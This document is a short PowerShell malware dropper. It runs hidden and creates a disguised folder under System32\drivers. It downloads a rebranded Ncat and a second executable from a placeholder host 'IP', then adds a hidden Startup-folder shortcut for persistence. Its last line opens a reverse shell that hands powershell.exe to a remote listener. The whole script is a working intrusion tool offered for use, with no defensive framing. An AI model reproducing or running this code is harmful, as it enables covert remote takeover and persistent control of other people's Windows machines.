# run in a hidden powershell prompt 
powershell.exe -windowstyle hidden -Command {
# get username 
$Name = ((Get-WMIObject -ClassName Win32_ComputerSystem).Username).Split('\')[1]
#create the root dir 
mkdir C:\Windows\System32\drivers\wfd
cd C:\Windows\System32\drivers\wfd
#create the lua dir 
mkdir C:\Windows\System32\drivers\wfd\cdoL
#create the contrib dir
mkdir C:\Windows\System32\drivers\wfd\cdoC
#download the executable (Win32_Lua.exe is basicly Ncat rebranded)
curl -o .\cdoL\Win32_Lua.exe   http://IP/Win32_Lua.exe 
curl -o .\cdoC\Win32_Contrib.exe   http://IP/Win32_Contrib.exe 
#Creations of a temp environement variable. 
$Env:Path += "C:\Windows\System32\drivers\wfd\cdoL"
cd .\cdoC
# create the shortcut to the startup file for persistence
$TargetFile = "C:\Windows\System32\drivers\wfd\cdoC\Win32_Contrib.exe" 
$ShortcutFile = "C:\Users\$Name\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Win32_Contrib.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$Shortcut.TargetPath = $TargetFile 
# define the display as reducted
$Shortcut.WindowStyle = 7
$Shortcut.Save()
# Make the file hidden
attrib +h "C:\Users\$Name\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Win32_Contrib.lnk"
#run the thing
Win32_Lua.exe  IP PORT -e powershell.exe } 
######ok 